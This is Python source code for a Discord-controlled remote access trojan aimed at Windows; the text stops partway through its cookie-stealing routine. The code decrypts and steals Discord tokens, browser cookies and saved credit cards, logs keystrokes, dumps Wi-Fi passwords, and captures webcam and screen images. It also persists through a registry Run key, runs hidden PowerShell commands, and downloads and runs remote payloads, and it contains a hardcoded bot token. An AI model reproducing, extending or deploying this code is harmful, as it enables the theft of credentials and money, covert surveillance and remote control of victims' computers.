import asyncio
import base64
import ctypes
import datetime
import io
import json
import ssl
import string
import pathlib
import posixpath
import os
import platform
import random
import re
import shutil
import socket
import sqlite3
import subprocess
import sys
import threading
import time
import urllib.request
import winreg
from shutil import copy2
from getpass import getuser
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import psutil
from discord import Embed
import cv2
import discord
import pyaudio
import pyautogui
import requests
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from os.path import expanduser
from datetime import timedelta
from os import getenv
from discord.ext import commands, tasks
from io import BytesIO
from discord import File
import win32crypt  # ✅ VOEG DIE TOE!

def get_bot_token():
    """Get token - HARCODED VERSION"""
    return "MTQxNjc4MjAwNjYyODM4OTEwNw.GaVp3G.ZRzn1oKAKWfVG8efDnRfeoeufs_DxSdr4_nrvA"  # NIEUWE token

# =============================================
# ENHANCED TOKEN STEALER (REPLACEMENT)
# =============================================

class EnhancedTokenStealer:
    def __init__(self):
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.regexp_enc = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        
    def extract_all_tokens(self):
        """Extract tokens from both Discord app AND browsers"""
        self.tokens = []
        
        # 1. Extract from Discord Desktop App
        self.extract_discord_app_tokens()
        
        # 2. Extract from Browser Local Storage
        self.extract_browser_tokens()
        
        # 3. Extract from Browser Session Storage
        self.extract_browser_session_tokens()
        
        return self.tokens
    
    def extract_discord_app_tokens(self):
        """Extract tokens from Discord desktop application"""
        discord_paths = [
            self.roaming + '\\discord\\Local Storage\\leveldb\\',
            self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                self.scan_storage_files(path)
    
    def extract_browser_tokens(self):
        """Extract tokens from browser local storage"""
        browser_paths = {
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        }
        
        for browser_name, path in browser_paths.items():
            if os.path.exists(path):
                self.scan_storage_files(path)
    
    def extract_browser_session_tokens(self):
        """Extract tokens from browser session storage and cookies"""
        browser_data_locations = [
            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Session Storage\\',
            self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Session Storage\\',
            self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Session Storage\\',
            self.appdata + '\\Google\\Chrome\\User Data\\Default\\Network\\Cookies',
            self.appdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies',
        ]
        
        for location in browser_data_locations:
            if os.path.exists(location):
                self.scan_storage_files(location)
    
    def scan_storage_files(self, path):
        """Scan storage files for tokens"""
        try:
            for file_name in os.listdir(path):
                if file_name.endswith(('.log', '.ldb')):
                    file_path = os.path.join(path, file_name)
                    self.scan_file_for_tokens(file_path)
        except Exception as e:
            pass
    
    def scan_file_for_tokens(self, file_path):
        """Scan individual file for Discord tokens"""
        try:
            with open(file_path, 'r', errors='ignore') as f:
                content = f.read()
                
            for token in re.findall(self.regexp, content):
                if self.validate_token(token):
                    self.tokens.append(token)
            
            for encrypted in re.findall(self.regexp_enc, content):
                try:
                    encrypted_data = base64.b64decode(encrypted.split('dQw4w9WgXcQ:')[1])
                    token = self.decrypt_token(encrypted_data, self.get_discord_master_key())
                    if token and self.validate_token(token):
                        self.tokens.append(token)
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def get_discord_master_key(self):
        """Get master key for Discord token decryption"""
        discord_paths = [
            self.roaming + '\\discord\\Local State',
            self.roaming + '\\discordcanary\\Local State',
            self.roaming + '\\discordptb\\Local State',
        ]
        
        for path in discord_paths:
            if os.path.exists(path):
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        local_state = json.loads(f.read())
                    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
                    return master_key
                except:
                    continue
        return None
    
    def decrypt_token(self, buff, master_key):
        """Decrypt encrypted Discord token"""
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_token = cipher.decrypt(payload)
            return decrypted_token[:-16].decode()
        except:
            return None
    
    def validate_token(self, token):
        """Validate if token is working"""
        try:
            headers = {'Authorization': token}
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            return response.status_code == 200
        except:
            return False

# =============================================
# NEW FEATURES (ADDITIONS)
# =============================================

class KeyLogger:
    def __init__(self):
        self.log = ""
        self.listener = None
        
    def on_press(self, key):
        try:
            self.log += str(key).replace("'", "")
            if len(self.log) > 100:
                self.save_log()
        except:
            pass
    
    def save_log(self):
        with open("keylog.txt", "a", encoding="utf-8") as f:
            f.write(self.log)
        self.log = ""
    
    def start(self):
        self.listener = Listener(on_press=self.on_press)
        self.listener.start()
    
    def stop(self):
        if self.listener:
            self.listener.stop()

keylogger = KeyLogger()

class CreditCardStealer:
    def extract_chrome_credit_cards(self):
        """Extract saved credit cards from Chrome"""
        cards = []
        try:
            chrome_path = os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data")
            if os.path.exists(chrome_path):
                shutil.copy2(chrome_path, "chrome_web_data.db")
                conn = sqlite3.connect("chrome_web_data.db")
                cursor = conn.cursor()
                
                cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                for row in cursor.fetchall():
                    name, exp_month, exp_year, encrypted_card = row
                    if name and encrypted_card:
                        cards.append({
                            'name': name,
                            'expiry': f"{exp_month}/{exp_year}",
                            'number': 'ENCRYPTED (Need Master Key)'
                        })
                
                cursor.close()
                conn.close()
                os.remove("chrome_web_data.db")
        except:
            pass
        return cards

# =============================================
# YOUR ORIGINAL CODE STARTS HERE (100% PRESERVED)
# =============================================

# Feature : PUBLIC IP ADDRESS FETCH
def get_public_ip():
    try:
        response = requests.get('https://api.ipify.org/?format=json')
        data = response.json()
        public_ip = data['ip']
        return public_ip
    except:
        return 'N/A'

# Feature : CREATE CATEGORY & CHANNELS
@bot.event
async def on_ready():
    print(f'Bot connected as {bot.user.name}')
    guild = bot.guilds[0]  # Assuming the bot is only in one guild/server

    # Check if the category and channels already exist
    category = discord.utils.get(guild.categories, name='═══ ・➣ 🐀 RAT PORTAL・')
    if not category:
        # Create the category
        category = await guild.create_category('═══ ・➣ 🐀 RAT PORTAL・')

        # Create the channels
        channel_names = ['・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ', '・⌨│ᴛᴇʀᴍɪɴᴀʟ', '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ', '・🔑│ᴋᴇʏʟᴏɢꜱ', '・🔔│ʀᴀᴛ-ʟᴏɢꜱ']
        for name in channel_names:
            await guild.create_text_channel(name, category=category)

    # Get system information
    system_name = socket.gethostname()
    public_ip = get_public_ip()
    system_ip = socket.gethostbyname(socket.gethostname())

    # Find the channel for device logs
    device_logs_channel = discord.utils.get(category.channels, name='・📊│ᴅᴇᴠɪᴄᴇ-ʟᴏɢꜱ')
    if device_logs_channel:
        embed = discord.Embed(title='🔵 System is Online', color=0xFF0000)  # Embed Color: Red
        embed.add_field(name='🖥️ System Name', value=f'```{system_name}```', inline=False)  # Bold Text: System Name
        embed.add_field(name='📢 Public IP Address', value=f'```{public_ip}```', inline=False)  # Bold Text: Public IP Address
        embed.add_field(name='🌐 System IP Address', value=f'```{system_ip}```', inline=False)  # Bold Text: System IP Address

        # Add Footer with bot, date, and time information
        current_time = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        footer_text = f'RAT | Date: {current_time}'
        embed.set_footer(text=footer_text)

        await device_logs_channel.send(embed=embed)

# Dictionary containing command descriptions
command_descriptions = {
    "!cam_list": "Displays a list of available webcams.",
    "!camic [cam_id]": "Takes a shot with the default webcam or the specified webcam ID.",
    "!clear <count>": "Clears the specified number of messages in the current chat.",
    "!download <path>": "Downloads a file from the specified URL and saves it to the provided path.",
    "!grab_cookies": "Grabs saved cookies from the default web browser.",
    "!grab_distoken": "Grabs the Discord user token.",
    "!grab_password": "Grabs saved passwords from the default web browser.",
    "!grab_wifi": "Grabs saved WiFi passwords on the device.",
    "!help": "Shows a message containing the list of commands and their descriptions.",
    "!kill_process": "Terminates a specified process by name.",
    "!list_process": "Lists all currently running processes.",
    "!ping": "Checks if the bot is online and responsive.",
    "!powershell <cmd>": "Executes the provided PowerShell command.",
    "!bot_down": "Shuts down the bot.",
    "!screenlogger <on/off>": "Enables or disables the functionality to send screenshots every 10 seconds.",
    "!screenshot": "Takes a screenshot of the current screen.",
    "!set_payload <url>": "Automatically executes and deletes a payload from the provided URL.",
    "!sys_info": "Retrieves and displays system information.",
    "!sys_log": "Retrieves and displays system logs.",
    "!sys_restart": "Restarts the system.",
    "!sys_shutdown": "Shuts down the system.",
    # NEW COMMANDS ADDED:
    "!grab_credit_cards": "Steals saved credit cards from browsers",
    "!find_documents [type]": "Hunts for PDFs, Word docs, Excel files",
    "!grab_crypto_wallets": "Steals cryptocurrency wallet files", 
    "!grab_game_tokens": "Finds game installations and tokens",
    "!network_scan": "Scans local network for other devices",
    "!start_keylogger": "Starts recording all keystrokes",
    "!stop_keylogger": "Stops keylogger and shows captured data",
    #Ultra  NEW COMMANDS
    "!live_webcam start|stop": "Start/stop live webcam stream",
    "!grab_social_media [platform]": "Steal Facebook, Instagram, Twitter, TikTok sessions", 
    "!remote_desktop start|stop [quality]": "Start remote desktop stream (quality 10-100)",
    "!remote_control [command]": "Remote control mouse/keyboard"
}

@bot.command(name='bot_help')
async def bot_help(ctx):
    help_message = "**Available Commands:**\n\n"
    for command, description in command_descriptions.items():
        help_message += f"{command}: {description}\n\n"

    # Send the message inside a code block
    boxed_help_message = f"```md\n{help_message}```"
    await ctx.send(boxed_help_message)

# Feature : REGISTRY INJECTION
def remove_startup_key():
    try:
        # Open the "Run" registry key
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)

        # Delete the registry value
        winreg.DeleteValue(key, "MyStartupKey")

        # Close the registry key
        winreg.CloseKey(key)
    except FileNotFoundError:
        pass

def add_to_startup():
    # Open the "Run" registry key
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    
    # Get the path to the current executable
    executable_path = os.path.abspath(sys.executable)
    
    # Create a new registry value with your desired name and executable path
    winreg.SetValueEx(key, "MyStartupKey", 0, winreg.REG_SZ, executable_path)
    
    # Close the registry key
    winreg.CloseKey(key)

def run_as_admin():
    # Get the script filename
    script_filename = os.path.abspath(sys.argv[0])

    # Get the required privileges elevation parameters
    params = f'"{script_filename}"'
    shell32 = ctypes.windll.shell32
    shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)

if __name__ == "__main__":
    remove_startup_key()  # Remove existing registry entry if present
    try:
        add_to_startup()
    except PermissionError:
        run_as_admin()

# Command : POWERSHELL
@bot.command()
async def powershell(ctx, *, command):
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window

        output = subprocess.check_output(["powershell", command], startupinfo=startupinfo, universal_newlines=True)

        if len(output) > 2000:
            with open('output.txt', 'w', encoding='utf-8') as file:
                file.write(output)

            await ctx.send(file=discord.File('output.txt'))
            os.remove('output.txt')
        else:
            await ctx.send(f'```{output}```')
    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')

# Command : SYSTEM LOG 
@bot.command()
async def sys_log(ctx):
    try:
        fetching_time = 60  # Time in seconds to fetch system logs
        backup_count = fetching_time

        countdown_message = await ctx.send(f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        for count in range(backup_count - 1, 0, -1):
            await asyncio.sleep(1)
            backup_count = count
            await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count} seconds left```")

        await asyncio.sleep(1)
        await countdown_message.edit(content=f"```Fetching System Logs. This May Take a Few Seconds...\nFetching... {backup_count - 1} seconds left```")

        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE  # Hide the console window

        output = subprocess.check_output(["powershell", "Get-WinEvent -LogName System | Select-Object -Property TimeCreated, Message"], startupinfo=startupinfo, universal_newlines=True)

        with open('syslog.txt', 'w', encoding='utf-8') as file:
            file.write(output)

        await ctx.send("System logs retrieved : ``syslog.txt``")
        await ctx.send(file=discord.File('syslog.txt'))
        os.remove('syslog.txt')

    except subprocess.CalledProcessError as e:
        await ctx.send(f'Command execution failed with error code {e.returncode}')

# Function : SCREENLOGGER
screenlogger_enabled = False

# Function to send keylogs and screenshots to Discord channel as an embed message
async def send_logs_and_screenshot(ctx):  # Add ctx as a parameter
    global screenlogger_enabled

    while screenlogger_enabled:
        # Capture screenshot
        screenshot = pyautogui.screenshot()
        screenshot_bytes = BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        # Create the embed object
        embed = discord.Embed(title='Screenshot', color=discord.Color.blue())

        # Attach the screenshot to the embed
        file = discord.File(screenshot_bytes, filename='screenshot.png')
        embed.set_image(url='attachment://screenshot.png')

        # Send the embed message to the specified channel
        channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'
        channel = discord.utils.get(ctx.guild.channels, name=channel_name)
        if channel:
            await channel.send(embed=embed, file=file)

        # Schedule the next execution of the coroutine after 10 seconds
        await asyncio.sleep(10)

# Command: SCREENLOGGER
@bot.command()
async def screenlogger(ctx, state):
    global screenlogger_enabled

    channel_name = '・📱│ꜱᴄʀᴇᴇɴʟᴏɢꜱ'

    if state == 'on':
        if not screenlogger_enabled:
            screenlogger_enabled = True
            asyncio.create_task(send_logs_and_screenshot(ctx))  # Pass ctx as an argument
            await ctx.send('Screenlogger is now ``Enabled 🟢``')
        else:
            await ctx.send('Screenlogger is **Already** ``Enabled 🟢``')
    elif state == 'off':
        if screenlogger_enabled:
            screenlogger_enabled = False
            await ctx.send('Screenlogger is now ``Disabled ⚫``')
        else:
            await ctx.send('Screenlogger is **Already** ``Disabled ⚫``')
    else:
        await ctx.send('Invalid state. Please use `on` or `off`.')

# Command: SET PAYLOAD
@bot.command()
async def set_payload(ctx, url: str):
    try:
        parsed_url = urllib.parse.urlparse(url)
        filename = os.path.basename(parsed_url.path)

        ssl_context = ssl.create_default_context()
        ssl_context.check_hostname = False
        ssl_context.verify_mode = ssl.CERT_NONE

        max_retry_attempts = 3
        retry_delay = 2

        for attempt in range(1, max_retry_attempts + 1):
            try:
                response = requests.get(url, verify=False)
                response.raise_for_status()
                content = response.content
                break

            except (requests.RequestException, IOError) as e:
                await ctx.send(f'Error downloading the file: {str(e)}. Retrying in {retry_delay} seconds...')
                time.sleep(retry_delay)

                if attempt == max_retry_attempts:
                    await ctx.send('Maximum number of retry attempts reached. Unable to download the file.')
                    return

        home_dir = os.path.expanduser("~")
        downloads_folder = os.path.join(home_dir, "Downloads")
        file_path = os.path.join(downloads_folder, filename)
        
        with open(file_path, 'wb') as file:
            file.write(content)

        await ctx.send(f'File downloaded successfully to ``📁 {file_path}``')

        command = f'start-process -FilePath "{file_path}"'
        subprocess.run(['powershell.exe', '-Command', command], shell=True)

        await ctx.send('File installed and executed.')

        await asyncio.sleep(10)

        os.remove(file_path)

        await ctx.send('File deleted permanently.')

    except Exception as e:
        await ctx.send(f'Error: {str(e)}')

# Command: SCREENSHOT
@bot.command()
async def screenshot(ctx):
    # Get the directory where the script is located
    script_dir = os.path.dirname(os.path.abspath(__file__))

    # Take a screenshot of the screen
    screenshot = pyautogui.screenshot()

    # Convert the screenshot to bytes
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    img_bytes.seek(0)

    # Construct the relative path to the app icon
    app_icon_path = os.path.join(script_dir, 'Windows_Defender-Logo.wine.ico')

    # Send the screenshot as an attachment in Discord
    picture = discord.File(img_bytes, filename='spyshot.png')
    await ctx.send(file=picture)

# Command : GRAB WIFI
@bot.command()
async def grab_wifi(ctx):
    try:
        result = subprocess.run(['netsh', 'wlan', 'show', 'profile'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        output = result.stdout

        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]

        wifi_passwords = []

        for profile in profiles:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            profile_output = result.stdout

            if "Key Content" in profile_output:
                password_line = [line.split(":")[1].strip() for line in profile_output.splitlines() if "Key Content" in line]
                wifi_passwords.append((profile, password_line[0]))

        if wifi_passwords:
            for wifi in wifi_passwords:
                await ctx.send(f'``📶 Wi-Fi Network: {wifi[0]}, 🔑 Password: {wifi[1]}``')
        else:
            await ctx.send('No saved Wi-Fi passwords found.')
    except Exception as e:
        await ctx.send(f'Error occurred while retrieving Wi-Fi passwords: {str(e)}')

# Command : PING
@bot.command()
async def ping(ctx):
    start_time = datetime.datetime.now()
    message = await ctx.send('Calculating ping...')
    end_time = datetime.datetime.now()

    latency = round((end_time - start_time).total_seconds() * 1000)

    if latency < 50:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :green_circle: Excellent'
    elif latency < 100:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :yellow_circle: Moderate'
    else:
        response = f'Pong! Latency: {latency}ms \nLatency Status: :red_circle: Poor'

    response = response.replace(":green_circle:", "🟢")
    response = response.replace(":yellow_circle:", "🟡")
    response = response.replace(":red_circle:", "🔴")

    await message.edit(content=f'```\n{response}\n```')

    if latency >= 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency increased to: {latency}ms\n```')
    elif latency < 50:
        await asyncio.sleep(5)
        await message.edit(content=f'```\nLatency decreased to: {latency}ms\n```')

# Function : SYSTEM INFO
# Helper functions to extract specific information from systeminfo command output
def get_value_by_label(label, output):
    label = label + ":"
    lines = output.splitlines()
    for line in lines:
        if line.startswith(label):
            return line.split(label)[1].strip()
    return None

def get_os_version(output):
    return get_value_by_label("OS Version", output)

def get_os_manufacturer(output):
    return get_value_by_label("OS Manufacturer", output)

def get_os_configuration(output):
    return get_value_by_label("OS Configuration", output)

def get_os_build_type(output):
    return get_value_by_label("OS Build Type", output)

def get_registered_owner(output):
    return get_value_by_label("Registered Owner", output)

def get_registered_organization(output):
    return get_value_by_label("Registered Organization", output)

def get_product_id(output):
    return get_value_by_label("Product ID", output)

def get_original_install_date(output):
    return get_value_by_label("Original Install Date", output)

def get_system_boot_time(output):
    return get_value_by_label("System Boot Time", output)

def get_system_manufacturer(output):
    return get_value_by_label("System Manufacturer", output)

def get_system_model(output):
    return get_value_by_label("System Model", output)

def get_system_type(output):
    return get_value_by_label("System Type", output)

def get_processors(output):
    return get_value_by_label("Processor(s)", output)

def get_bios_version(output):
    return get_value_by_label("BIOS Version", output)

def get_windows_directory(output):
    return get_value_by_label("Windows Directory", output)

def get_system_directory(output):
    return get_value_by_label("System Directory", output)

def get_boot_device(output):
    return get_value_by_label("Boot Device", output)

def get_system_locale(output):
    return get_value_by_label("System Locale", output)

def get_input_locale(output):
    return get_value_by_label("Input Locale", output)

def get_time_zone(output):
    return get_value_by_label("Time Zone", output)

def get_available_physical_memory(output):
    return get_value_by_label("Available Physical Memory", output)

def get_virtual_memory_max_size(output):
    return get_value_by_label("Virtual Memory: Max Size", output)

def get_virtual_memory_available(output):
    return get_value_by_label("Virtual Memory: Available", output)

def get_virtual_memory_in_use(output):
    return get_value_by_label("Virtual Memory: In Use", output)

def get_page_file_locations(output):
    return get_value_by_label("Page File Location(s)", output)

def get_domain(output):
    return get_value_by_label("Domain", output)

def get_logon_server(output):
    return get_value_by_label("Logon Server", output)

def get_hotfixes(output):
    return get_value_by_label("Hotfix(s)", output)

def get_network_cards(output):
    return get_value_by_label("Network Card(s)", output)

def get_hyperv_requirements(output):
    return get_value_by_label("Hyper-V Requirements", output)

def get_battery_percentage(output):
    return get_value_by_label("Battery Percentage", output)

# Command : SYSTEM INFO
@bot.command()
async def sys_info(ctx):
    try:
        os_info = subprocess.run(
            'powershell.exe systeminfo', 
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).stdout
    except FileNotFoundError:
        await ctx.send("The 'systeminfo' command is not available on this system.")
        return

    os_version = get_os_version(os_info)
    os_manufacturer = get_os_manufacturer(os_info)
    os_configuration = get_os_configuration(os_info)
    os_build_type = get_os_build_type(os_info)
    registered_owner = get_registered_owner(os_info)
    registered_organization = get_registered_organization(os_info)
    product_id = get_product_id(os_info)
    original_install_date = get_original_install_date(os_info)
    system_boot_time = get_system_boot_time(os_info)
    system_manufacturer = get_system_manufacturer(os_info)
    system_model = get_system_model(os_info)
    system_type = get_system_type(os_info)
    processors = get_processors(os_info)
    bios_version = get_bios_version(os_info)
    windows_directory = get_windows_directory(os_info)
    system_directory = get_system_directory(os_info)
    boot_device = get_boot_device(os_info)
    system_locale = get_system_locale(os_info)
    input_locale = get_input_locale(os_info)
    time_zone = get_time_zone(os_info)
    available_physical_memory = get_available_physical_memory(os_info)
    virtual_memory_max_size = get_virtual_memory_max_size(os_info)
    virtual_memory_available = get_virtual_memory_available(os_info)
    virtual_memory_in_use = get_virtual_memory_in_use(os_info)
    page_file_locations = get_page_file_locations(os_info)
    domain = get_domain(os_info)
    logon_server = get_logon_server(os_info)
    hotfixes = get_hotfixes(os_info)
    network_cards = get_network_cards(os_info)
    hyperv_requirements = get_hyperv_requirements(os_info)
    battery_percentage = get_battery_percentage(os_info)

    info_message = f"OS Version: {os_version}\n" \
                   f"OS Manufacturer: {os_manufacturer}\n" \
                   f"OS Configuration: {os_configuration}\n" \
                   f"OS Build Type: {os_build_type}\n" \
                   f"Registered Owner: {registered_owner}\n" \
                   f"Registered Organization: {registered_organization}\n" \
                   f"Product ID: {product_id}\n" \
                   f"Original Install Date: {original_install_date}\n" \
                   f"System Boot Time: {system_boot_time}\n" \
                   f"System Manufacturer: {system_manufacturer}\n" \
                   f"System Model: {system_model}\n" \
                   f"System Type: {system_type}\n" \
                   f"Processors: {processors}\n" \
                   f"BIOS Version: {bios_version}\n" \
                   f"Windows Directory: {windows_directory}\n" \
                   f"System Directory: {system_directory}\n" \
                   f"Boot Device: {boot_device}\n" \
                   f"System Locale: {system_locale}\n" \
                   f"Input Locale: {input_locale}\n" \
                   f"Time Zone: {time_zone}\n" \
                   f"Available Physical Memory: {available_physical_memory}\n" \
                   f"Virtual Memory: Max Size: {virtual_memory_max_size}\n" \
                   f"Virtual Memory: Available: {virtual_memory_available}\n" \
                   f"Virtual Memory: In Use: {virtual_memory_in_use}\n" \
                   f"Page File Location(s): {page_file_locations}\n" \
                   f"Domain: {domain}\n" \
                   f"Logon Server: {logon_server}\n" \
                   f"Hotfix(s): {hotfixes}\n" \
                   f"Network Card(s): {network_cards}\n" \
                   f"Hyper-V Requirements: {hyperv_requirements}\n" \
                   f"Battery Percentage: {battery_percentage}\n"

    # Split the message into smaller parts if it exceeds the character limit
    messages = []
    while len(info_message) > 0:
        messages.append(info_message[:2000])
        info_message = info_message[2000:]

    for message in messages:
        code_block_message = f"```{message}```"  # Send As A Box
        await ctx.send(code_block_message)

# Command : DOWNLOAD
@bot.command()
async def download(ctx, source_path):
    target_channel = ctx.message.channel  # Use the current Discord channel as the target channel
    try:
        with open(source_path, 'rb') as file:
            await target_channel.send(file=discord.File(file))
        filename = os.path.basename(source_path)
        await ctx.send(f"📁 ``{filename}`` Downloaded Successfully!")
    except FileNotFoundError:
        await ctx.send("Source file not found.")

# Command : CAM LIST
@bot.command()
async def cam_list(ctx):
    # Get the list of available webcam devices
    device_list = []
    for i in range(10):
        cap = cv2.VideoCapture(i)
        if cap.isOpened():
            _, _ = cap.read()
            device_list.append(f"Webcam {i}")
            cap.release()
        else:
            break

    # Send the list of webcam devices to Discord
    device_info = '\n'.join(device_list)
    await ctx.send(f"Available webcam devices:\n{device_info}")

# Command : CAMIC
@bot.command()
async def camic(ctx, device_id=None):
    # Check if a specific webcam device is provided
    if device_id is not None:
        try:
            device_id = int(device_id)
        except ValueError:
            await ctx.send("Invalid device ID. Please provide a valid numeric ID.")
            return
    else:
        device_id = 0  # Default to the first webcam device

    # Capture photo from the specified webcam
    cap = cv2.VideoCapture(device_id)
    if not cap.isOpened():
        await ctx.send("Failed to open the webcam device.")
        return

    ret, frame = cap.read()

    # Convert the frame to bytes
    _, buffer = cv2.imencode('.jpg', frame)
    img_bytes = buffer.tobytes()

    # Send the photo to Discord
    picture = discord.File(io.BytesIO(img_bytes), filename='webcam_photo.jpg')
    await ctx.send(file=picture)

    # Release the webcam
    cap.release()

def grab_cookies():
    browser = Browsers()
    browser.grab_cookies()


def create_temp(_dir: str or os.PathLike = None):
    if _dir is None:
        _dir = os.path.expanduser("~/tmp")
    if not os.path.exists(_dir):
        os.makedirs(_dir)
    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
    path = os.path.join(_dir, file_name)
    open(path, "x").close()
    return path

class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)    
        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass
        time.sleep(3)

    def grab_cookies(self):
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies
            ]

            for profile in self.profiles:
                for func in self.funcs:
                    self.process_browser(name, path, profile, func)

    def process_browser(self, name, path, profile, func):
        try:
            func(name, path, profile)
        except Exception as e:
            print(f"Error occurred while processing browser '{name}' with profile '{profile}': {str(e)}")

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception as e:
            print(f"Error occurred while retrieving master key: {str(e)}")

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def cookies(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Network\\Cookies'
        else:
            path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        cookievault = create_temp()
        copy2(path, cookievault)
        conn = sqlite3.connect(cookievault)
        cursor = conn.cursor()
        with open(os.path.join(f"C:\\Users\\{getuser()}\\cookies.txt"), 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name} | Profile: {profile}\n\n")
            for res in cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies").fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and value != "":
